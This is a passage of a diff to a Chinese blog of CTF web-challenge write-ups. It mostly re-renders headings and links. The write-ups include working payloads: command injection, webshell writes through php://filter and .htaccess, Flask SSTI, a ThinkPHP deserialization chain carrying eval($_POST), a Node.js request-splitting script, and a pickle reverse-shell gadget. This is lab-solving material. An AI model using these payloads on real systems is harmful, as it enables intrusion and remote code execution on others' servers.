 <pre class="line-numbers language-none"><code class="language-none">?comm1&#x3D;&quot;;tac &#x2F;f*;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2><p>这题和**[EIS 2019]EzPOP**完全一致，唯一不同就是在文件名处多了过滤</p>
+
+        <h2 id="2020-新春红包题-1"   >
+          <a href="#2020-新春红包题-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2020-新春红包题-1" class="headerlink" title="[2020 新春红包题]1"></a>[2020 新春红包题]1</h2>
+      <p>这题和**[EIS 2019]EzPOP**完全一致，唯一不同就是在文件名处多了过滤</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>
     <span class="token comment">// 使缓存文件名随机</span>
     <span class="token variable">$cache_filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
@@ -2107,13 +1863,22 @@ payload_password <span class="token operator">=</span><span class="token string"
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>此处我们可以使用伪协议加目录穿越来绕过，传入<code>key = &quot;/../shell.php/.&quot;;</code>且<code>options[&#39;prefix&#39;] = &#39;php://filter/write=convert.base64-decode/resource=&#39;;</code>，此时内容变为：<code>php://filter/write=convert.base64-decode/resource=62a58e2e23e33/../shell.php</code>直接绕过</p>
-<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><p>文件上传.htaccess包含利用，首先在htaccess文件中是有注释符的，就它#，但是php不读这个的啊，那么我们就上传.htaccess文件并包含htaccess并且注释掉一句话木马即可，末尾记得加反斜杠来转译换行，file使用\来绕过</p>
+
+        <h2 id="羊城杯2020-easyphp"   >
+          <a href="#羊城杯2020-easyphp" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2>
+      <p>文件上传.htaccess包含利用，首先在htaccess文件中是有注释符的，就它#，但是php不读这个的啊，那么我们就上传.htaccess文件并包含htaccess并且注释掉一句话木马即可，末尾记得加反斜杠来转译换行，file使用\来绕过</p>
 <pre class="line-numbers language-none"><code class="language-none">php_value auto_prepend_fil
 \e .htaccess
 #&lt;?php system(&#39;tac &#x2F;f*&#39;);?&gt;\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2><p>这个非预期和上面那个一样，也是传入htaccess文件执行</p>
-<h2 id="pasecactf-2019-flask-ssti"><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2><p>过滤了’，.，_，使用16进制绕过，直接给payload了</p>
+
+        <h2 id="XNUCA2019Qualifier-EasyPHP"   >
+          <a href="#XNUCA2019Qualifier-EasyPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h2>
+      <p>这个非预期和上面那个一样，也是传入htaccess文件执行</p>
+
+        <h2 id="pasecactf-2019-flask-ssti"   >
+          <a href="#pasecactf-2019-flask-ssti" class="heading-link"><i class="fas fa-link"></i></a><a href="#pasecactf-2019-flask-ssti" class="headerlink" title="[pasecactf_2019]flask_ssti"></a>[pasecactf_2019]flask_ssti</h2>
+      <p>过滤了’，.，_，使用16进制绕过，直接给payload了</p>
 <pre class="line-numbers language-none"><code class="language-none">nickname&#x3D;&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;tac app*&quot;)[&quot;read&quot;]()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>但是很明显看到源码也没啥用，因为flag已经被销毁了</p>
@@ -2145,7 +1910,10 @@ flag <span class="token operator">=</span> <span class="token string">""</span>
 os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"/app/flag"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>使用这个函数反向跑出flag即可</p>
-<h2 id="安洵杯-2019-iamthinking"><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2><p><a target="_blank" rel="noopener" href="http://www.zip下载源码/">www.zip下载源码</a></p>
+
+        <h2 id="安洵杯-2019-iamthinking"   >
+          <a href="#安洵杯-2019-iamthinking" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-iamthinking" class="headerlink" title="[安洵杯 2019]iamthinking"></a>[安洵杯 2019]iamthinking</h2>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip下载源码/" >www.zip下载源码</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
 <span class="token keyword">use</span> <span class="token package">app<span class="token punctuation">\</span>BaseController</span><span class="token punctuation">;</span>
@@ -2174,11 +1942,14 @@ os<span class="token punctuation">.</span>remove<span class="token punctuation">
     <span class="token punctuation">&#125;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>可以看到这里有个反序列化，没有其他的方法了，只能看thinkPHP的反序列化漏洞了，至于其中的对第一个匹配的绕过，看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11137159.html">这里</a>，其中thinkPHP的反序列化链子可以用<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/phpggc">这个</a>工具生成</p>
+<p>可以看到这里有个反序列化，没有其他的方法了，只能看thinkPHP的反序列化漏洞了，至于其中的对第一个匹配的绕过，看<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11137159.html" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，其中thinkPHP的反序列化链子可以用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/phpggc" >这个</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>工具生成</p>
 <p>最终payload</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;public&#x2F;?payload&#x3D;O%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A9%3A%22%00%2A%00suffix%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3BN%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3BN%3Bs%3A18%3A%22%00think%5CModel%00force%22%3BN%3Bs%3A13%3A%22%00%2A%00connection%22%3BN%3Bs%3A9%3A%22%00%2A%00suffix%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A196%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22eval%28%24_POST%5B1%5D%29%3B%22%3B%7Ds%3A8%3A%22function%22%3Bs%3A38%3A%22function+%28%29+use+%28%24code%29+%7Beval%28%24code%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000001dae5f69000000005d7b61f7%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2><p>从头开始找反序列化链子呗</p>
+
+        <h2 id="CISCN2019-总决赛-Day1-Web4-Laravel1"   >
+          <a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-总决赛-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 总决赛 Day1 Web4]Laravel1"></a>[CISCN2019 总决赛 Day1 Web4]Laravel1</h2>
+      <p>从头开始找反序列化链子呗</p>
 <p>/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php中的<code>__destruct</code>方法为起始点，跟进<code>commit</code>方法，跟进<code>invalidateTags</code>方法</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
     <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">deferred</span><span class="token punctuation">;</span>
@@ -2238,9 +2009,15 @@ os<span class="token punctuation">.</span>remove<span class="token punctuation">
 <span class="token punctuation">&#125;</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p>看源码，uploads文件夹，随便点一个文件看参数，任意文件读取，此处要绕一下../，变成…//</p>
+
+        <h2 id="virink-2019-files-share"   >
+          <a href="#virink-2019-files-share" class="heading-link"><i class="fas fa-link"></i></a><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2>
+      <p>看源码，uploads文件夹，随便点一个文件看参数，任意文件读取，此处要绕一下../，变成…//</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png"></p>
-<h2 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2><p>和Love Math一样，构造_GET来自己塞东西进去</p>
+
+        <h2 id="NESTCTF-2019-Love-Math-2"   >
+          <a href="#NESTCTF-2019-Love-Math-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h2>
+      <p>和Love Math一样，构造_GET来自己塞东西进去</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'abs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'acosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'asinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan2'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'atanh'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'bindec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ceil'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cos'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'cosh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'decbin'</span> <span class="token punctuation">,</span> <span class="token string single-quoted-string">'decoct'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'exp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'expm1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'floor'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'fmod'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hypot'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log10'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log1p'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'log'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'max'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'min'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_getrandmax'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mt_srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'octdec'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pi'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pow'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rad2deg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'rand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'round'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sin'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sinh'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'srand'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tan'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tanh'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">&lt;=</span><span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$k</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
@@ -2256,13 +2033,19 @@ os<span class="token punctuation">.</span>remove<span class="token punctuation">
 <p>最终payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;cat%20&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>提示图片点击可以下载，任意文件读取</p>
+
+        <h2 id="PASECA2019-honey-shop"   >
+          <a href="#PASECA2019-honey-shop" class="heading-link"><i class="fas fa-link"></i></a><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2>
+      <p>提示图片点击可以下载，任意文件读取</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png"></p>
 <p>读取到环境变量中的<code>SECRET_KEY=Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR</code>，源码读不到但是知道是python环境，flask-session伪造</p>
 <pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s &quot;私钥&quot;  -t &quot;内容&quot; 
 python3 flask_session_cookie_manager3.py encode -s &quot;Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR&quot;  -t &quot;&#123;&#39;balance&#39;:114514&#125;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p>源码喵喵</p>
+
+        <h2 id="GYCTF2020-Node-Game"   >
+          <a href="#GYCTF2020-Node-Game" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2>
+      <p>源码喵喵</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -2384,16 +2167,19 @@ app<span class="token punctuation">.</span><span class="token function">get</spa
 <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>能分析的都写到代码注释里面了，下面要利用的一个node.js早期的拆分攻击漏洞，先贴一个大佬<a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/119068329">wp</a></p>
+<p>能分析的都写到代码注释里面了，下面要利用的一个node.js早期的拆分攻击漏洞，先贴一个大佬<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/119068329" >wp</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <p>拆分攻击，是指在HTTP请求头中伪造出\r\n转义字符，来使得HTTP服务器将一个请求当作两个或多个请求执行，当然，大部分服务器都考虑到了这种情况，会将传来的内容进行转译，node.js也不例外，但是在node.js 8版本及以前，node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，导致字符会被截断，使得我们需要的\r\n出现，具体可见下面的内容</p>
 <blockquote>
-<h1 id="HTTP请求路径中的unicode字符损坏"><a href="#HTTP请求路径中的unicode字符损坏" class="headerlink" title="HTTP请求路径中的unicode字符损坏"></a>HTTP请求路径中的unicode字符损坏</h1><p>一切都开始于我调试的一个非关联的unicode处理issue，并最终将我引向一个错误报告：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/issues/13296">bug report against the Node.js <code>http</code> module</a>,报告中提到：</p>
+
+        <h1 id="HTTP请求路径中的unicode字符损坏"   >
+          <a href="#HTTP请求路径中的unicode字符损坏" class="heading-link"><i class="fas fa-link"></i></a><a href="#HTTP请求路径中的unicode字符损坏" class="headerlink" title="HTTP请求路径中的unicode字符损坏"></a>HTTP请求路径中的unicode字符损坏</h1>
+      <p>一切都开始于我调试的一个非关联的unicode处理issue，并最终将我引向一个错误报告：<a target="_blank" rel="noopener" href="https://github.com/nodejs/node/issues/13296">bug report against the Node.js <code>http</code> module</a>,报告中提到：</p>
 <p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png" alt="img"></a></p>
 <p>换句话说，报告者使用Node.js向特定路径发出HTTP请求，但是发出的请求实际上被定向到了不一样的路径！深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时对unicode字符的有损编码引起的。</p>
 <p>虽然用户发出的<code>http</code>请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，例如🐶</p>
 <p>相反，这些字符被截断为其JavaScript表示的最低字节：<br><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png" alt="img"></a></p>
 <p>处理用户输入时的坏数据通常是底层安全问题的危险信号，我知道我们的代码库发出了可能包含用户输入的路径的HTTP请求。所以我立即在Bugzilla中提交了一个保密的安全漏洞，向node安全团队寻求更多信息，然后根据用户提供的unicode字符串寻找我们可能构建URL的地方。</p>
-<p>内容源自：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894">https://xz.aliyun.com/t/2894</a></p>
+<p>内容源自：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2894" >https://xz.aliyun.com/t/2894</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 </blockquote>
 <p>偷一个大佬的脚本</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
@@ -2435,7 +2221,10 @@ response1 <span class="token operator">=</span> session<span class="token punctu
 response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg'</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>明示pickle，先解码看看</p>
+
+        <h2 id="watevrCTF-2019-Pickle-Store"   >
+          <a href="#watevrCTF-2019-Pickle-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2>
+      <p>明示pickle，先解码看看</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png"></p>
 <p>很明显有加密验证啊，那就不能伪造内容了，只能自己搞个类反弹shell了</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
@@ -2447,12 +2236,24 @@ response <span class="token operator">=</span> session<span class="token punctua
 a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>XSSSSSSSSSSSSSS，不出网，还是之后XSS平台能用了再说吧</p>
-<h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>注册登录看到jwt，扫目录扫出来密钥，直接伪造admin就行</p>
-<h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p>除了SSTI还能是啥</p>
+
+        <h2 id="CISCN2019-华东北赛区-Web2"   >
+          <a href="#CISCN2019-华东北赛区-Web2" class="heading-link"><i class="fas fa-link"></i></a><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2>
+      <p>XSSSSSSSSSSSSSS，不出网，还是之后XSS平台能用了再说吧</p>
+
+        <h2 id="RootersCTF2019-ImgXweb"   >
+          <a href="#RootersCTF2019-ImgXweb" class="heading-link"><i class="fas fa-link"></i></a><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2>
+      <p>注册登录看到jwt，扫目录扫出来密钥，直接伪造admin就行</p>
+
+        <h2 id="GWCTF-2019-你的名字"   >
+          <a href="#GWCTF-2019-你的名字" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2>
+      <p>除了SSTI还能是啥</p>
 <p>测试呗，输入个两对花括号发现被滤了，<del>还爆出了是php环境，其实并不是，估计是BUU复现环境的问题</del></p>
 <p>没关系还有命令执行可用，啥符号都没过滤直接拼接就行</p>
